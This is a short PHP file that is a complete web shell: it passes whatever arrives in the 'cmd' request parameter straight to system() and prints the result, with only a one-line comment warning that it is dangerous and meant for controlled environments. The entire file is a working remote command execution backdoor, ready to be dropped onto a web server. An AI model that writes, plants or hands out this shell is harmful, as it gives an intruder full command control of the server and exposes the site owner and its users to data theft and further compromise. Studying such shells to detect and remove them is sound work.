<?php
// PHP Shell - Remote Command Execution
// WARNING: This script is extremely dangerous and should only be used in controlled environments.

// Check if the 'cmd' parameter is set
if (isset($_REQUEST['cmd'])) {
    // Execute the command and display the output
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
} else {
    // If no command is specified, display a message
    echo "No command specified. Use the 'cmd' parameter to execute commands.";
}
?>
